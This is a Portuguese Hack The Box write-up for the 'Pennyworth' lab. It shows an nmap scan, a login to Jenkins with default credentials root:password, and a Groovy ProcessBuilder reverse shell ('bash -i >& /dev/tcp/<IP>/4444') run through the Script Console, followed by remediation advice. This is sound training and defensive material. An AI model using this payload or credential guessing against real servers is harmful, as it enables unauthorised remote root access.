---
title: "Writeup Hack The Box: Pennyworth"
date: 2025-12-17
description: "RCE via Jenkins Script Console devido a credenciais administrativas fracas."
tags: ["htb", "jenkins", "rce", "misconfiguration", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Sumário Executivo

O host expôs uma instância do Jenkins acessível via HTTP. A autenticação foi comprometida através de credenciais fracas, permitindo acesso ao Script Console e execução remota de comandos como **root**, resultando no comprometimento total do sistema.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Descoberta
A varredura identificou um servidor Jetty rodando Jenkins na porta 8080.
```bash
sudo nmap -sS -T4 -p- -sV -O 10.129.7.209
```
* **Técnica MITRE:** [T1046](https://attack.mitre.org/techniques/T1046/) - Varredura de Serviços de Rede.

#### 2. Enumeração
Testes manuais de credenciais comuns (password spraying) identificaram com sucesso um acesso administrativo válido.
* **Credenciais:** `root:password`
* **Técnica MITRE:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) - Força Bruta: Quebra de Senha.

#### 3. Exploração
O Jenkins Script Console (`/script`) foi utilizado para executar código Groovy. Uma shell reversa foi estabelecida usando `ProcessBuilder` para contornar limitações de execução padrão.
```groovy
def pb = new ProcessBuilder("/bin/bash", "-c", "bash -i >& /dev/tcp/<IP>/4444 0>&1")
pb.redirectErrorStream(true)
pb.start()
```
* **Técnica MITRE:** [T1609](https://attack.mitre.org/techniques/T1609/) - Orquestração de Container/Job: Execução em Container/Job.

### Remediação (NIST SP 800-115)

* **Gestão de Identidade:** Aplicar uma política de senhas fortes e remover credenciais padrão ou fracas.
* **Segurança de Rede:** Restringir o acesso à interface do Jenkins via whitelist de IP ou VPN.
* **Hardening de Serviço:** Desabilitar o Script Console se não for necessário e executar o serviço Jenkins com um usuário sem privilégios.